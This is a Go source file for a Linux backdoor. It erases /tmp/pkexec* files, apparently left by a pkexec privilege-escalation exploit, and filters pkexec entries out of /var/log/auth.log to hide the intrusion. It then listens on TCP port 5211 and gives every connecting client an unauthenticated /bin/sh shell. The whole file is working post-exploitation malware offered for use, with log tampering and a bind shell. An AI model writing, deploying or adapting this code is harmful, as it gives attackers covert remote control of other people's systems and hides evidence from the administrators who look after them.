package main

import (
	"bytes"
	"fmt"
	"net"
	"os/exec"
)

var left = "[+] Connect backdoor success, press enter to join the shell :):"

func showMSG(conn net.Conn) {
	msg := "\t\t\twelcome to lUc1f3r11(QQ:1185151867)'s backdoor[default port:5211]\t\t\n"
	m := []byte(msg)
	conn.Write(m)
}

func Shellout(command string) (error, string, string) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command("/bin/sh", "-c", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	return err, stdout.String(), stderr.String()
}

func main() {
	var cmd *exec.Cmd
	ln, err := net.Listen("tcp", ":5211")
	buffRecv := make([]byte, 128)
	if err != nil {
		fmt.Println(err)
	}

	clean := "PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
	clean1 := "rm -rfv /tmp/pkexec*;"
	clean2 := "cat /var/log/auth.log|grep -v pkexec >/tmp/al;cat /tmp/al >/var/log/auth.log;"
	clean3 := "rm -rfv /tmp/al;"
	fmt.Println("[+] setting command exec path env")
	Shellout(clean)
	fmt.Println("[+] cleaning /tmp/pkexec* files")
	Shellout(clean1)
	fmt.Println("[+] cleaning /var/log/auth.log pkexec logs")
	Shellout(clean2)
	fmt.Println("[+] cleaning /tmp/al")
	Shellout(clean3)
	fmt.Println("[+] open a bind tcp shell on port 5211")

	for {
		conn, err := ln.Accept()
		showMSG(conn)
		if err != nil {
			continue
		}
		c := []byte(left)
		for {
			conn.Write(c)
			length, err := conn.Read(buffRecv)
			if length == 10 {
			}
			if err != nil {
			}
			//fmt recf
			cmd = exec.Command("/bin/sh")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn
			cmd.Run()
			buffRecv = make([]byte, 128)
		}
	}
}
